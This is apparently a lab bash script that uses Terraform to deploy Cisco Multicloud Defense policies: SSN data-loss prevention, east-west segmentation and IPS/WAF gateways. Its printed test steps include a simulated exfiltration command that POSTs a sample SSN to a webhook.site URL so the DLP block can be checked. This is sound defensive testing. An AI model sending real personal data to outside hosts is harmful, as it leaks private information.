#!/bin/bash

# Cisco Multicloud Defense - Security Configuration Script
# This script deploys security policies and protections:
# - Egress Protection: DLP to prevent SSN data exfiltration
# - East-West Security: Allow pod app1 to app2 communication
# - Ingress Protection: IPS/WAF for web server protection

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to sanitize output by removing sensitive values
sanitize_output() {
    sed -E 's/AKIA[A-Z0-9]{16}/AKIA************/g' | \
    sed -E 's/[A-Za-z0-9/+=]{40}/****REDACTED****/g' | \
    sed -E 's/"api_key":\s*"[^"]*"/"api_key": "****REDACTED****"/g' | \
    sed -E 's/aws_secret_access_key[[:space:]]*=[[:space:]]*[^[:space:]]*/aws_secret_access_key = ****REDACTED****/g' | \
    grep -v "Warning: Argument is deprecated" | \
    grep -v "network_interface is deprecated"
}

echo ""
echo "╔════════════════════════════════════════════════════════════╗"
echo "║   Cisco Multicloud Defense - Security Configuration     ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""

# Check if terraform is installed
if ! command -v terraform &> /dev/null; then
    echo -e "${RED}❌ Terraform is not installed${NC}"
    echo "Please install Terraform first: https://www.terraform.io/downloads"
    exit 1
fi

# Check if we're in the right directory
if [ ! -f "main.tf" ]; then
    echo -e "${RED}❌ main.tf not found${NC}"
    echo "Please run this script from the project root directory"
    exit 1
fi

# Get pod number
POD_NUMBER=$(grep -E '^pod_number' terraform.tfvars 2>/dev/null | awk -F'=' '{print $2}' | tr -d ' "')

if [ -z "$POD_NUMBER" ]; then
    echo -e "${RED}❌ Pod number not found in terraform.tfvars${NC}"
    echo "Please run ./init-lab.sh first"
    exit 1
fi

echo -e "${GREEN}✓ Pod Number: ${POD_NUMBER}${NC}"
echo ""

echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}🔒 Security Features to Deploy${NC}"
echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
echo ""
echo "1. 📤 Egress Security (DLP)"
echo "   • Data Loss Prevention Profile"
echo "   • Block SSN exfiltration from app servers"
echo "   • Egress Gateway with DLP inspection"
echo ""
echo "2. 🔄 East-West Security"
echo "   • Allow pod${POD_NUMBER}-app1 → pod${POD_NUMBER}-app2 traffic"
echo "   • Micro-segmentation policy rules"
echo "   • Traffic logging and monitoring"
echo ""
echo "3. 📥 Ingress Security (IPS/WAF)"
echo "   • Intrusion Prevention System (IPS)"
echo "   • Web Application Firewall protection"
echo "   • Ingress Gateway with threat protection"
echo ""
echo "4. 🏗️ Infrastructure Components"
echo "   • Gateway Load Balancer (GWLB)"
echo "   • Address & Service Objects"
echo "   • Note: Service VPC already deployed in deploy.sh"
echo ""

# Check if infrastructure is deployed
if [ ! -f "terraform.tfstate" ] || [ ! -s "terraform.tfstate" ]; then
    echo -e "${YELLOW}⚠️  Warning: No infrastructure state found${NC}"
    echo ""
    echo "You need to deploy the base infrastructure first using:"
    echo "  ./deploy.sh"
    echo ""
    read -p "Continue anyway? (yes/no): " CONTINUE
    if [ "$CONTINUE" != "yes" ]; then
        echo "Cancelled."
        exit 0
    fi
fi

echo -e "${YELLOW}════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}⚠️  Important: Security Deployment${NC}"
echo -e "${YELLOW}════════════════════════════════════════════════════════════${NC}"
echo ""
echo "This will deploy security policies that include:"
echo "  • Data Loss Prevention (DLP) for SSN protection"
echo "  • Network segmentation rules"
echo "  • IPS/WAF threat protection"
echo ""
echo "Estimated deployment time: 10-15 minutes"
echo ""

read -p "Continue with security deployment? (yes/no): " CONFIRM

if [ "$CONFIRM" != "yes" ]; then
    echo -e "${YELLOW}⚠️  Security deployment cancelled${NC}"
    exit 0
fi

echo ""
echo -e "${YELLOW}🔧 Initializing Terraform...${NC}"
echo ""

# Initialize terraform
if terraform init -upgrade 2>&1 | sanitize_output; then
    echo ""
    echo -e "${GREEN}✓ Terraform initialized${NC}"
else
    echo ""
    echo -e "${RED}❌ Terraform initialization failed${NC}"
    exit 1
fi

# Target only the security-related resources
# Note: Service VPC is deployed in deploy.sh, not here
SECURITY_TARGETS=(
    "ciscomcd_address_object.app1-egress-addr-object"
    "ciscomcd_address_object.app2-egress-addr-object"
    "ciscomcd_address_object.app1-ingress-addr-object"
    "ciscomcd_service_object.app1_svc_http"
    "ciscomcd_profile_dlp.block-ssn-dlp"
    "ciscomcd_policy_rule_set.egress_policy"
    "ciscomcd_policy_rules.egress-ew-policy-rules"
    "ciscomcd_policy_rule_set.ingress_policy"
    "ciscomcd_policy_rules.ingress-policy-rules"
    "ciscomcd_gateway.aws-egress-gw"
    "ciscomcd_gateway.aws-ingress-gw"
    "data.aws_security_group.datapath-sg"
    "aws_security_group_rule.datapath-rule"
)

echo ""
echo -e "${YELLOW}📋 Planning security deployment...${NC}"
echo ""

# Build target arguments
TARGET_ARGS=""
for target in "${SECURITY_TARGETS[@]}"; do
    TARGET_ARGS="${TARGET_ARGS} -target=${target}"
done

# Create plan
if terraform plan -out=security-tfplan $TARGET_ARGS 2>&1 | sanitize_output; then
    echo ""
    echo -e "${GREEN}✓ Security plan created${NC}"
else
    echo ""
    echo -e "${RED}❌ Security planning failed${NC}"
    exit 1
fi

echo ""
echo -e "${YELLOW}🚀 Deploying security configuration...${NC}"
echo ""
echo "This will take approximately 10-15 minutes..."
echo "Progress updates will appear below:"
echo ""

# Apply the plan
APPLY_OUTPUT=$(terraform apply -auto-approve security-tfplan 2>&1 | sanitize_output)
APPLY_STATUS=$?

# Check for "already exists" errors
ONLY_EXISTS_ERRORS=false
if [ $APPLY_STATUS -ne 0 ]; then
    if echo "$APPLY_OUTPUT" | grep -qiE "(already exists|duplicate entry)"; then
        OTHER_ERRORS=$(echo "$APPLY_OUTPUT" | grep "Error:" | grep -viE "(already exists|duplicate entry|address group exists|dlp profile already exists|Service VPC.*already exists|policy_rule_sets)")
        if [ -z "$OTHER_ERRORS" ]; then
            ONLY_EXISTS_ERRORS=true
        fi
    fi
fi

# Display filtered output
if [ "$ONLY_EXISTS_ERRORS" = true ]; then
    echo "$APPLY_OUTPUT" | grep -v "╷" | grep -v "│" | grep -v "╵" | grep -viE "(address group exists|dlp profile already exists|Service VPC.*already exists|Duplicate entry.*policy_rule_sets)" || echo "$APPLY_OUTPUT"
else
    echo "$APPLY_OUTPUT"
fi

if [ $APPLY_STATUS -eq 0 ] || [ "$ONLY_EXISTS_ERRORS" = true ]; then
    echo ""
    echo -e "${GREEN}════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}✅ Security Configuration Deployed Successfully!${NC}"
    echo -e "${GREEN}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    if [ "$ONLY_EXISTS_ERRORS" = true ]; then
        echo -e "${BLUE}ℹ️  Note: Some security resources were already configured.${NC}"
        echo -e "${BLUE}   This is normal in container environments.${NC}"
        echo ""
    fi
    
    echo -e "${BLUE}🔒 Security Policies Deployed:${NC}"
    echo ""
    echo "✓ Egress Security:"
    echo "  • DLP Profile: pod${POD_NUMBER}-block-ssn"
    echo "  • Blocks: US Social Security Numbers"
    echo "  • Gateway: pod${POD_NUMBER}-egress-gw-aws"
    echo ""
    echo "✓ East-West Security:"
    echo "  • Policy: pod${POD_NUMBER}-egress-policy"
    echo "  • Rule 1: App1 → Internet (with DLP)"
    echo "  • Rule 2: App1 → App2 (allowed)"
    echo ""
    echo "✓ Ingress Security:"
    echo "  • Policy: pod${POD_NUMBER}-ingress-policy"
    echo "  • IPS Profile: Balanced Alert"
    echo "  • Gateway: pod${POD_NUMBER}-ingress-gw-aws"
    echo ""
    echo "✓ Infrastructure:"
    echo "  • Security Gateways: Egress + Ingress deployed"
    echo "  • Gateway Load Balancer (GWLB): MCD-managed"
    echo "  • Service VPC: Already deployed (192.168.${POD_NUMBER}.0/24)"
    echo ""
    
    echo -e "${YELLOW}🧪 Test Your Security Configuration:${NC}"
    echo ""
    echo "1. Test DLP (Should be blocked):"
    echo "   ssh -i \$SSH_KEY ubuntu@\$APP1_PUBLIC_IP"
    echo "   curl -X POST https://webhook.site/your-unique-url -d 'SSN: 123-45-6789'"
    echo ""
    echo "2. Test East-West (Should succeed):"
    echo "   ssh -i \$SSH_KEY ubuntu@\$APP1_PUBLIC_IP"
    echo "   curl http://\$APP2_PUBLIC_IP"
    echo ""
    echo "Copy-paste ready commands:"
    source ./env-helper.sh
    export_deployment_vars
    echo "   ssh -i $SSH_KEY ubuntu@$APP1_PUBLIC_IP"
    echo "   curl http://$APP2_PUBLIC_IP"
    echo ""
    echo "3. View policies in Cisco MCD Console:"
    echo "   https://defense.cisco.com"
    echo "   Navigate to: Manage → Policy Rule Sets"
    echo ""
    
    # Cleanup
    rm -f security-tfplan
    
    echo -e "${BLUE}📖 For more details, read instructions on the left!${NC}"
    echo ""
    exit 0
else
    echo ""
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}❌ Security Deployment Failed${NC}"
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo "Please review the errors above."
    echo ""
    echo "Common issues:"
    echo "  • Base infrastructure not deployed (run ./deploy.sh first)"
    echo "  • API credentials expired (check terraform.tfvars)"
    echo "  • Service VPC already exists (run in fresh container)"
    echo ""
    
    # Cleanup
    rm -f security-tfplan
    exit 1
fi

